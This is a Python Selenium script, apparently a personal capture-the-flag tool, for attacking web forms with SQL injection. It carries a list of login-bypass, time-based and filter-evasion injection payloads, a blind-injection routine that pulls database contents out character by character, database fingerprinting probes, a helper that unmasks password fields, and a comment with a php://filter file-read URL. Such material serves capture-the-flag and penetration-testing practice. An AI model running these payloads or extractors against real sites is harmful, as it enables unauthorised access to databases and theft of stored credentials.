#!/usr/bin/env python
# pip install selenium
# pip install ipython
# also install https://github.com/mozilla/geckodriver/releases
# sudo mv geckodriver /usr/bin
# export PATH=$PATH:/usr/bin/geckodriver
# then run script
# https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
# http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
# http://atta.cked.me/home/sqlite3injectioncheatsheet
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# https://gist.githubusercontent.com/MattDMo/6cb1dfbe8a124e1ca5af/raw/a511e86dde7b3a70bdbd63b7ac3c98c32cd74277/ipy_repl.py
# https://gist.github.com/MattDMo/6cb1dfbe8a124e1ca5af
# http://atta.cked.me/home/sqlite3injectioncheatsheet
# https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet
# https://sqliteonline.com/
# http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
# http://ringzer0team.com:1008/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php
# https://www.branah.com/ascii-converter
# ALWAYS LOOK IN SOURCE CODE, COOKIES AND HEADERS!
# Case sensitivity in sql: https://dev.mysql.com/doc/refman/5.7/en/case-sensitivity.html


from long_strings import *
import selenium
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import binascii
import hashlib
import string
from string import ascii_lowercase, ascii_uppercase
from select import select
import sys
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
import urllib
from enum import Enum
from IPython import embed


def stalenessOf(driver, element):
    try:
        element.is_enabled()
        return False
    except:
        return True 

def wait_for_page_load_after_element_click(element, timeout=3):
    htmlElem = browser.find_element_by_tag_name("html")
    element.click()
    WebDriverWait(browser, timeout).until(lambda d: stalenessOf(d, htmlElem))

def remove_password_type():
    for e in browser.find_elements_by_name('password'):
        browser.execute_script("return arguments[0].setAttribute('type','text')",e)
    for e in browser.find_elements_by_name('new_password'):
        browser.execute_script("return arguments[0].setAttribute('type','text')",e)
    for e in browser.find_elements_by_name('pass'):
        browser.execute_script("return arguments[0].setAttribute('type','text')",e)

def check_not_key_pressed(): #Inverse checking to ease programming
    rlist, wlist, xlist = select([sys.stdin], [], [], 0.1)
    if rlist:
        return False
    else:
        return True

def general_brute_force_substr(func, payload, letters="", lower=False, upper=False, number=False, punct=False):
    try:
        current = ""
        if lower:
            for i in ascii_lowercase:
                hasError = True
                while hasError:
                    hasError = False
                    try:
                        if check_not_key_pressed() and func(payload.replace("[count]",str(len(letters) + 1)).replace("[letters]",letters + i)):
                            general_brute_force_substr(func, payload, letters + i, lower, upper, number, punct)
                            return;
                    except Exception as ex:
                        show_exception(ex)
                        print "Retrying last..."
                        hasError = True

                    
        if upper:
            for j in ascii_uppercase:
                hasError = True
                while hasError:
                    hasError = False
                    try:
                        if check_not_key_pressed() and func(payload.replace("[count]",str(len(letters) + 1)).replace("[letters]",letters + j)):
                            general_brute_force_substr(func, payload, letters + j, lower, upper, number, punct)
                            return;
                    except Exception as ex:
                        show_exception(ex)
                        print "Retrying last..."
                        hasError = True
        if number:
            for k in range(0,10):
                hasError = True
                while hasError:
                    hasError = False
                    try:
                        if check_not_key_pressed() and func(payload.replace("[count]",str(len(letters) + 1)).replace("[letters]",letters + str(k))):
                            general_brute_force_substr(func, payload, letters + str(k), lower, upper, number, punct)
                            return;
                    except Exception as ex:
                        show_exception(ex)
                        print "Retrying last..."
                        hasError = True

        if punct:
            print("Doing punct")
            for l in string.punctuation:
                hasError = True
                while hasError:
                    hasError = False
                    try:
                        if check_not_key_pressed() and func(payload.replace("[count]",str(len(letters) + 1)).replace("[letters]",letters + l)):
                            general_brute_force_substr(func, payload, letters + l, lower, upper, number, punct)
                            return;
                    except Exception as ex:
                        show_exception(ex)
                        print "Retrying last..."
                        hasError = True
        print("Result: " + "'" + letters + "'")
    except Exception as ex:
        show_exception(ex)
        print "Retrying complete round..."
        general_brute_force_substr(func, payload, letters, lower, upper, number, punct)
        return;

def all_256_character_as_char_brute_force_substr(func, payload, numbers_as_array=[]):
    try:
        current = ""
        for i in range(0,256):
            hasError = True
            while hasError:
                hasError = False
                try:
                    if check_not_key_pressed() and func(payload.replace("[count]",str(len(numbers_as_array) + 1)).replace("[letters]",translate_numbers_to_concat_chars(numbers_as_array + [i]))):
                        all_256_character_brute_force_substr(func, payload, numbers_as_array + [i])
                        return;
                except Exception as ex:
                    show_exception(ex)
                    print "Retrying last..."
                    hasError = True
        print("Result: " + "'" + numbers_as_array + "'")
    except Exception as ex:
        show_exception(ex)
        print "Retrying complete round..."
        all_256_character_brute_force_substr(func, payload, numbers_as_array)
        return;

def translate_numbers_to_concat_chars(numbers):
    r = "concat("
    for n in numbers[:-1]:
        r = r + "char(" + str(n) + "),"

    r = r + "char(" + str(numbers[-1]) + ")"
    r = r + ")"
    return r

allPossibleHex = ["01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"]

#https://www.branah.com/ascii-converter
def all_256_character_as_hex_brute_force_substr(func, payload, letters_as_hex):
    try:
        current = ""
        for i in allPossibleHex:
            hasError = True
            while hasError:
                hasError = False
                try:
                    if check_not_key_pressed() and func(payload.replace("[count]",str((len(letters_as_hex) / 2) + 1)).replace("[letters]","0x" + letters_as_hex + i)):
                        all_256_character_as_hex_brute_force_substr(func, payload, "" + letters_as_hex + i)
                        return;
                except Exception as ex:
                    show_exception(ex)
                    print "Retrying last..."
                    hasError = True
        print("Result: " + "'" + letters_as_hex + "'")
    except Exception as ex:
        show_exception(ex)
        print "Retrying complete round..."
        all_256_character_as_hex_brute_force_substr(func, payload, letters_as_hex)
        return;


def show_exception(ex):
    template = "\tAn exception of type {0} occurred. Arguments:\n\t{1!r}"
    message = template.format(type(ex).__name__, ex.args)
    print message

def try_default_SQLi_tests(func):
    '''
    http://www.joellipman.com/articles/web-development/basic-tests-for-sql-injection-vulnerabilities.html
    admin' -- 
    admin' # 
    admin'/* 
    ' or 1=1-- 
    ' or 1=1# 
    ' or 1=1/* 
    ') or '1'='1-- 
    ') or ('1'='1-- 
    '''
    payloads = [
        "admin' --",
        "admin' #",
        "admin'/*",
        "999999 or 1=1 or 1=1",
        "' or 1=1 or '1'='1",
        '" or 1=1 or "1"="1',
        "999999) or 1=1 or (1=1",
        "') or 1=1 or ('1'='1",
        '") or 1=1 or ("1"="1',
        "999999)) or 1=1 or ((1=1",
        "')) or 1=1 or (('1'='1",
        '")) or 1=1 or (("1"="1',
        "999999))) or 1=1 or (((1",
        "'))) or 1=1 or ((('1'='1",
        '"))) or 1=1 or ((("1"="1',
        "' OR \"1\"=\"1\" --",
        "' OR '1'='1",
        "' OR 1<2 --'",
        "' OR 2>1 --"
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' OR ''='",
        "1='1",
        "'\nOR 1=1--",
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "' or#newline",
        "' /*!50000or*/1='1",
        "' /*!or*/1='1",
        "@#=6453kfe",
        "1';select 1",
        "/*!32302 1/0, */",
        "';waitfor delay '0:0:10'--",
        "y?2`Fg0y1&&qiJH`Gl<p5hRZp<g(ICZ{3<)(..:e|<xgWI9V,k4s<.[L-6p}WgZ]~h",
        "4-1" #Should be id=3
    ]
    for payload in payloads:
        if raw_input("Run payload? (Payload: [" + payload + "]) ").lower() != 'n':
            func(payload)
            show_success_or_danger()
    for payload in payloads:
        if raw_input("Run payload url encoded? (Payload: [" + payload + "]) ").lower() != 'n':
            func(urllib.quote_plus(payload))
            show_success_or_danger()
        if raw_input("Run payload url encoded twice? (Payload: [" + payload + "]) ").lower() != 'n':
            func(urllib.quote_plus(urllib.quote_plus(payload)))
            show_success_or_danger()

def enum(**enums):
    return type('Enum', (), enums)

DBMS = enum(MySQL="MYSQL",PostgreSQL="POSTGRESQL",SQLite="SQLITE",MSSQL="MSSQL")

#https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint
def dbms_detection_values(dbms):
    print("\nYou can also refer to: https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint\n")
    if dbms == DBMS.MySQL:
        array = ["sleep(5)", "CONCAT('a','a')"]
        print ', '.join(array)
        return array
    if dbms == DBMS.PostgreSQL:
        array = ["pg_sleep(5)", "'a' || 'a'"]
        print ', '.join(array)
        return array
    if dbms == DBMS.SQLite:
        array = ["randomblob(100000000)"]
        print ', '.join(array)
        return array
    if dbms == DBMS.MSSQL:
        array = ["@@version", "'a' + 'a'"]
        print ', '.join(array)
        return array

def detect_dbms(func):
    for dbms in [DBMS.MySQL, DBMS.PostgreSQL, DBMS.SQLite, DBMS.MSSQL]:
        for dbmsVal in dbms_detection_values(dbms):
            if func(dbmsVal):
                print dbmsVal + " seemed to work for dbms: " + dbms

def print_banner():
    print(banner)

def get_usefull_functions():
    print(usefull_function)


def init():
    global browser
    default_site = raw_input('Please enter the default url to access [https://github.com/tristandostaler/CTFTool]: ')
    if default_site == "":
        default_site = "https://github.com/tristandostaler/CTFTool"
    use_proxy = raw_input('Use proxy (eg. Burp) [Y/n]? ')
    if use_proxy.lower() != "n":
        proxyHost = raw_input('Please provide the proxy host [127.0.0.1]: ')
        if proxyHost == "":
            proxyHost = "127.0.0.1"
        proxyPort = raw_input('Please provide the proxy port [8080]: ')
        if proxyPort == "":
            proxyPort = "8080"
        fp = webdriver.FirefoxProfile()
        fp.set_preference("network.proxy.type", 1)
        fp.set_preference("network.proxy.http", proxyHost) #HTTP PROXY
        fp.set_preference("network.proxy.http_port", int(proxyPort))
        fp.set_preference("network.proxy.ssl", proxyHost) #SSL  PROXY
        fp.set_preference("network.proxy.ssl_port", int(proxyPort))
        fp.set_preference("network.proxy.ftp", proxyHost) #HTTP PROXY
        fp.set_preference("network.proxy.ftp_port", int(proxyPort))
        fp.set_preference('network.proxy.socks', proxyHost) #SOCKS PROXY
        fp.set_preference('network.proxy.socks_port', int(proxyPort))
        fp.update_preferences()
        browser = webdriver.Firefox(firefox_profile=fp)
    else:
        browser = webdriver.Firefox()
    browser.get(default_site)

def login(form_control_name="form-control", form_control_index=0):
    global username
    global password
    if username == "":
        username = raw_input('Please provide the username to use by default: ')
    if password == "":
        password = raw_input('Please provide the password to use by default: ')
    browser.find_element_by_name('username').send_keys(username)
    browser.find_element_by_name('password').send_keys(password)
    browser.find_elements_by_class_name(form_control_name)[form_control_index].click()    

def main():
    print_banner()
    init()
    #login()
    print("\nMain done")

browser = None
username = ""
password = ""

if __name__ == "__main__":
    main()
    embed()
